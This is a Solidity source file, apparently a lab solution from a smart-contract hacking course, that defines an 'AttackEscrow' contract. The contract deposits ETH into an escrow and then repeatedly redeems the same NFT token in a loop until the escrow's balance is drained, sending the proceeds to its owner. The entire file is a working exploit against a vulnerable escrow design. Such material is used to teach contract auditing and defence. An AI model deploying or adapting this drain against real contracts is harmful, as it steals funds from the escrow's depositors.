// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";

interface IEscrowNFT is IERC721 {
    function tokenDetails(uint256) external view returns (uint256, uint256);
    function tokenCounter() external returns(uint256);
}

interface IEscrow {
    function escrowEth(address _recipient, uint256 _duration) external payable;
    function redeemEthFromEscrow(uint256 _tokenId) external;
}

/**
 * @title AttackEscrow
 * @author JohnnyTime (https://smartcontractshacking.com)
 */
contract AttackEscrow is Ownable {

    IEscrow private immutable escrow;
    IEscrowNFT private immutable nft;

    constructor(address _nft, address _escrow) {    
        nft = IEscrowNFT(_nft);
        escrow = IEscrow(_escrow);
    }

    function attack() external payable onlyOwner {
        escrow.escrowEth{value: msg.value}(address(this), 0);

        uint256 tokenId = nft.tokenCounter();
        uint256 escrowETHBalance = address(escrow).balance;

        while(escrowETHBalance >= msg.value) {
            escrow.redeemEthFromEscrow(tokenId);
            escrowETHBalance = address(escrow).balance;
        }

        (bool success, ) = owner().call{value: address(this).balance}("");
        require(success, "attack failed, eth couldn't be sent");
    }

    receive() external payable {}
}